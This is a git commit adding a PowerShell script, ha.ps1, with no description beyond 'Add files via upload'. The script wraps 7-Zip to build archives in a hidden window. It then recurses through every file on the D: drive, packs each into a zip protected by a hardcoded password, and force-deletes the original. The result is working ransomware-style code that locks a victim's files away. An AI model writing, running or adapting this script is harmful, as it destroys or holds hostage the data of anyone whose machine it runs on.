7d24b73d30958fbf1480b978e44bc692045b61db
Myagmardorj <67570666+zapataast@users.noreply.github.com>
2022-09-30 23:00:16 +0800

    Add files via upload

---
+++ ha.ps1
@@ -0,0 +1,42 @@
+function file_to_zip([string]$FilesToZip, [string]$ZipOutputFilePath, [string]$Password, [ValidateSet('7z','zip','gzip','bzip2','tar','iso','udf')][string]$CompressionType = 'zip', [switch]$HideWindow)
+{
+    # Look for the 7zip executable.
+    $pathTo32Bit7Zip = "C:\Program Files (x86)\7-Zip\7z.exe"
+    $pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"
+    $THIS_SCRIPTS_DIRECTORY = Split-Path $script:MyInvocation.MyCommand.Path
+    $pathToStandAloneExe = Join-Path $THIS_SCRIPTS_DIRECTORY "7za.exe"
+    if (Test-Path $pathTo64Bit7Zip) { $pathTo7ZipExe = $pathTo64Bit7Zip }
+    elseif (Test-Path $pathTo32Bit7Zip) { $pathTo7ZipExe = $pathTo32Bit7Zip }
+    elseif (Test-Path $pathToStandAloneExe) { $pathTo7ZipExe = $pathToStandAloneExe }
+    else { throw "Could not find the 7-zip executable." }
+
+    # Delete the destination zip file if it already exists (i.e. overwrite it).
+    if (Test-Path $ZipOutputFilePath) { Remove-Item $ZipOutputFilePath -Force }
+
+    $windowStyle = "Normal"
+    if ($HideWindow) { $windowStyle = "Hidden" }
+
+    # Create the arguments to use to zip up the files.
+    # Command-line argument syntax can be found at: http://www.dotnetperls.com/7-zip-examples
+    $arguments = "a -t$CompressionType ""$ZipOutputFilePath"" ""$FilesToZip"" -mx9"
+    if (!([string]::IsNullOrEmpty($Password))) { $arguments += " -p$Password" }
+
+    # Zip up the files.
+    $p = Start-Process $pathTo7ZipExe -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle
+
+    # If the files were not zipped successfully.
+    if (!(($p.HasExited -eq $true) -and ($p.ExitCode -eq 0)))
+    {
+        throw "There was a problem creating the zip file '$ZipFilePath'."
+    }
+}
+$password = "r0!i9wm3l8hhlrmod0w&vv-?vp9f?2!1ebqdqe%k"
+$a = Get-ChildItem -Path "D:\" -Recurse -File
+for ($i = 0; $i -lt $a.Count; $i++) {
+    <# Action that will repeat until the condition is met #>
+    $temp = $a.FullName[$i] + ".zip" 
+    file_to_zip $a.FullName[$i] $temp -HideWindow -Password $password
+    Remove-Item -Path $a.FullName[$i] -Force
+}
+
+
